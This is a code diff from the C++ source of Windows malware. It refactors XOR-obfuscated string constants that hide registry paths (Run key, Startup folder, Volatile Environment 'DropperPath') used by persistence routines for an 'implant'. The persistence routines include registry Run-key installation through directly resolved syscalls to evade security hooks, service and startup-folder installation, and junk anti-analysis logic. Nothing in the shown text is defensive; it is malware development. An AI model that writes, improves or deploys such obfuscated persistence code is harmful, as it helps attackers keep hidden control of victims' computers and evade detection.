@@ -23,14 +23,14 @@ namespace {
 
 // XOR encrypted (0x5A)
 // "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"
-std::wstring kShellFolders = L"\x09\x35\x3C\x2E\x2D\x3B\x28\x3F\x06\x17\x33\x39\x28\x35\x29\x35\x3C\x2E\x06\x0D\x33\x34\x3E\x35\x2D\x29\x06\x19\x2F\x28\x28\x3F\x34\x2E\x0C\x3F\x28\x29\x33\x35\x34\x06\x1F\x22\x2A\x36\x35\x28\x3F\x28\x06\x09\x32\x3F\x36\x36\x7A\x1C\x35\x36\x3E\x3F\x28\x29";
+const wchar_t kShellFoldersEnc[] = { 0x09, 0x35, 0x3C, 0x2E, 0x2D, 0x3B, 0x28, 0x3F, 0x06, 0x17, 0x33, 0x39, 0x28, 0x35, 0x29, 0x35, 0x3C, 0x2E, 0x06, 0x0D, 0x33, 0x34, 0x3E, 0x35, 0x2D, 0x29, 0x06, 0x19, 0x2F, 0x28, 0x28, 0x3F, 0x34, 0x2E, 0x0C, 0x3F, 0x28, 0x29, 0x33, 0x35, 0x34, 0x06, 0x1F, 0x22, 0x2A, 0x36, 0x35, 0x28, 0x3F, 0x28, 0x06, 0x09, 0x32, 0x3F, 0x36, 0x36, 0x7A, 0x1C, 0x35, 0x36, 0x3E, 0x3F, 0x28, 0x29 };
 // "Startup"
-std::wstring kStartupVal = L"\x09\x2E\x3B\x28\x2E\x2F\x2A";
+const wchar_t kStartupValEnc[] = { 0x09, 0x2E, 0x3B, 0x28, 0x2E, 0x2F, 0x2A };
 
 // "Volatile Environment"
-std::wstring kVolatileEnv = L"\x0C\x35\x36\x3B\x2E\x33\x36\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E";
+const wchar_t kVolatileEnvEnc[] = { 0x0C, 0x35, 0x36, 0x3B, 0x2E, 0x33, 0x36, 0x3F, 0x7A, 0x1F, 0x34, 0x2C, 0x33, 0x28, 0x35, 0x34, 0x37, 0x3F, 0x34, 0x2E };
 // "DropperPath"
-std::wstring kDropperPathVal = L"\x1E\x28\x35\x2A\x2A\x3F\x28\x0A\x3B\x2E\x32";
+const wchar_t kDropperPathValEnc[] = { 0x1E, 0x28, 0x35, 0x2A, 0x2A, 0x3F, 0x28, 0x0A, 0x3B, 0x2E, 0x32 };
 
 void JunkLogic() {
     volatile int x = 0;
@@ -45,7 +45,7 @@ struct PersistTarget {
 };
 
 // "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-std::wstring kRunKey = L"\x09\x35\x3C\x2E\x2D\x3B\x28\x3F\x06\x17\x33\x39\x28\x35\x29\x35\x3C\x2E\x06\x0D\x33\x34\x3E\x35\x2D\x29\x06\x19\x2F\x28\x28\x3F\x34\x2E\x0C\x3F\x28\x29\x33\x35\x34\x06\x08\x2F\x34";
+const wchar_t kRunKeyEnc[] = { 0x09, 0x35, 0x3C, 0x2E, 0x2D, 0x3B, 0x28, 0x3F, 0x06, 0x17, 0x33, 0x39, 0x28, 0x35, 0x29, 0x35, 0x3C, 0x2E, 0x06, 0x0D, 0x33, 0x34, 0x3E, 0x35, 0x2D, 0x29, 0x06, 0x19, 0x2F, 0x28, 0x28, 0x3F, 0x34, 0x2E, 0x0C, 0x3F, 0x28, 0x29, 0x33, 0x35, 0x34, 0x06, 0x08, 0x2F, 0x34 };
 
 std::wstring getExecutablePath() {
     wchar_t path[MAX_PATH];
@@ -118,7 +118,7 @@ bool InstallRegistryRun(const std::wstring& implantPath, const std::wstring& nam
     DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
     DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
 
-    std::wstring relativePath = utils::DecryptW(kRunKey);
+    std::wstring relativePath = utils::DecryptW(kRunKeyEnc, 45);
     std::wstring hkcuPath = L"\\Registry\\User\\" + sid + L"\\" + relativePath;
     UNICODE_STRING uHkcu;
     uHkcu.Buffer = (PWSTR)hkcuPath.c_str();
@@ -165,10 +165,10 @@ bool InstallService(const std::wstring& implantPath, const std::wstring& name) {
 bool InstallStartup(const std::wstring& implantPath, const std::wstring& name) {
     HKEY hKey;
     std::wstring startupPath;
-    if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kShellFolders).c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kShellFoldersEnc, 64).c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
         wchar_t path[MAX_PATH];
         DWORD sz = sizeof(path);
-        if (RegQueryValueExW(hKey, utils::DecryptW(kStartupVal).c_str(), NULL, NULL, (LPBYTE)path, &sz) == ERROR_SUCCESS) {
+        if (RegQueryValueExW(hKey, utils::DecryptW(kStartupValEnc, 7).c_str(), NULL, NULL, (LPBYTE)path, &sz) == ERROR_SUCCESS) {
             startupPath = path;
         }
         RegCloseKey(hKey);
@@ -211,10 +211,12 @@ std::wstring establishPersistence(const std::wstring& overrideSourcePath) {
         for (auto& c : current) c = (wchar_t)::towlower(c);
         if (current.find(L"explorer.exe") != std::wstring::npos || current.find(L"runtimebroker.exe") != std::wstring::npos) {
             HKEY hKey;
-            if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, 20);
+            std::wstring dropKey = utils::DecryptW(kDropperPathValEnc, 11);
+            if (RegOpenKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                 wchar_t buf[MAX_PATH];
                 DWORD sz = sizeof(buf);
-                if (RegQueryValueExW(hKey, utils::DecryptW(kDropperPathVal).c_str(), NULL, NULL, (LPBYTE)buf, &sz) == ERROR_SUCCESS) {
+                if (RegQueryValueExW(hKey, dropKey.c_str(), NULL, NULL, (LPBYTE)buf, &sz) == ERROR_SUCCESS) {
                     sourcePath = buf;
                 }
                 RegCloseKey(hKey);
